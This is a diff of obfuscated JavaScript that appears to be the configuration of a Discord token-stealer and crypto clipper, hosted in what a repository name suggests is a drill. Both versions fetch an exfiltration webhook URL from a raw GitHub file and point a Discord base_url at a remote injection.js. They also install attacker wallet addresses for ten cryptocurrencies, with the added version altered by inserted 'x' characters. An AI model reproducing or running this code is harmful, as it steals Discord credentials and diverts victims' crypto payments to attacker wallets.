@@ -1,16 +1,7 @@
 (async () => {
-  if (true || (webhooks["push"]((await requires["axios"]["get"]('https://raw.githubusercontent.com/vinhjaxt/1337wtf1337-drill/main/webhook.txt'))["data"]), false) && '' == '‌') {
-    var __p_5347475818 = "charAt";
-
-    function setCookie(...__p_7099570093) {
-      document.cookie = 'xxx'
-    }
-
-    setCookie(1, 2, 3)
-    debugger
-  }
+  webhooks["push"]((await requires["axios"]["get"]('https://raw.githubusercontent.com/vinhjaxt/1337wtf1337-drill/main/webhook.txt'))["data"])
   config["discord"]["base_url"] = "https://raw.githubusercontent.com/vinhjaxt/1337wtf1337-drill/main/injection.js";
-  for (let [key, value] of Object["entries"]({ "btc": "bc1q8mtpkcfwlff4dlguhxmsk8lhumzgxcd9t50vta", "ltc": "LTN4HSNNypGVtUGv9STKE9o8HmjcTkzeut", "xmr": "4B4D15Q6kas9YGxASZsqhBJVTvyDmS4kb522N8AvzNPx4zRgsxxBDzxPXwpZoCToJVMUffwjRDxNn9e8YbSTj7Sw5jGbwGS", "eth": "0x2086a641D1dD2C3557e6b880E8A97cfdfDb04d4E", "xrp": "rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf", "neo": "ANn5THmQidTh6zENyCytJV98i6po1dLJhh", "bch": "qzmckzguqmnldh825gjwv49p8zw5c5p02v0605gf5j", "doge": "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6", "dash": "Xn6Mnu6aDxYz2cmka77JE6w8YTULbHyYBR", "xlm": "GB7HQ2WNBSUNHATASST44ADP2ND34BRTHKWWLIKRU6YP54SJUK53OLQG" })) {
+  for (let [key, value] of Object["entries"]({ "btc": "bc1q8mtpkcfwlffx4dlguhxmsk8lxhumzgxcd9t50vta", "ltc": "LTN4HSNNypGVxtUxGv9STKE9o8HmjcTkzeut", "xmr": "4B4D15Q6kas9YxGxASZsqhBJVTvyDmSx4kb522N8AvzNPx4zRgsxxBDzxPXwpZoCxToJVMUffwjRDxxNn9e8YbSTj7Sw5jGbwGS", "eth": "0x2086a641D1dD2C355x7e6b8x80E8A97cfdfDb04d4E", "xrp": "rJvtAxrsqqv7LEmb3BFx6e1vHudGPCQppaxf", "neo": "ANn5THmQixdTh6xzENyCytJV98i6po1dLJhh", "bch": "qzmckzguqmxnldh825gjwv49p8zw5cx5p02v0605gf5j", "doge": "DQ5eZxQyMbCsAxGDoE7vq3zsPHx7v43EvfUV6", "dash": "Xn6Mnu6aDxxYz2cmka77xJE6w8YTxULbHyYBR", "xlm": "GB7HQ2WNBSUNHAxTASST44ADP2xND34BRTHKWWLxxIKRU6YP54SJUK53OLQG" })) {
     config["crypto"][key] = value;
   }
 })();
